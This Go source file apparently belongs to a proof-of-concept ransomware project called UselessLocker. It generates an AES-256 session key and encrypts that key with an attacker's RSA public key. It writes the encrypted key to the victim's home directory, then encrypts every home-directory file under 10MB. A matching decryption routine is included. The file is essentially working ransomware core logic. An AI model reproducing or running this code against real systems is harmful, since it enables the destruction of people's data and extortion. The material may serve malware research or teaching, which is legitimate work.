package useless

import (
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"

	"github.com/TheCreeper/UselessLocker/useless/crypto"
	"github.com/TheCreeper/UselessLocker/useless/store"
)

// CreateSession will generate a new AES key and encrypt it using the provided
// RSA public key.
func CreateSession(s store.StoreFS) (key []byte, err error) {
	// Copy public key file contents to memory
	b, err := s.ReadFile(PathPublicKey)
	if err != nil {
		return
	}

	// Generate a key to use for this session
	key, err = crypto.GenerateKey(crypto.AES256)
	if err != nil {
		return
	}
	return key, EncryptKey(key, b)
}

// EncryptKey will encrypt the provided AES key and write it out to the current
// users home directory.
func EncryptKey(key []byte, pub []byte) (err error) {
	u, err := user.Current()
	if err != nil {
		return
	}

	// Encrypt the generated aes key using the public key of the master
	// and write it out to the filesystem as soon as possible. We dont want
	// to encrypt files and lose the key.
	ekey, err := crypto.EncryptKey(pub, key)
	if err != nil {
		return
	}

	path := filepath.Join(u.HomeDir, PathEncryptedKey)
	return ioutil.WriteFile(path, ekey, 0750)
}

// EncryptHome will attempt to encrypt (using the provided key) all files in
// a users home directory that fit a specific criteria.
func EncryptHome(key []byte) (err error) {
	u, err := user.Current()
	if err != nil {
		return
	}

	// Get a list of files in the users home directory that are less
	// than 10MB
	files, err := GetFileList(u.HomeDir, 10485760)
	if err != nil {
		return
	}

	// Write out the file list to a file in the users home directory.
	if err = WriteFileList(u.HomeDir, files); err != nil {
		return
	}

	// Start encrypting each file in the list
	for _, file := range files {
		if err = crypto.EncryptFile(key, file); err != nil {
			return
		}
	}
	return
}

// DecryptHome will read the list of encrypted files and attempt to decrypt
// each one using the provided key.
func DecryptHome(key []byte) (err error) {
	u, err := user.Current()
	if err != nil {
		return
	}

	files, err := ReadFileList(u.HomeDir)
	if err != nil {
		return
	}
	for _, file := range files {
		// Check if file still exists otherwise skip it.
		if _, err := os.Stat(file); os.IsNotExist(err) {
			continue
		}

		if err = crypto.DecryptFile(key, file); err != nil {
			return
		}
	}
	return
}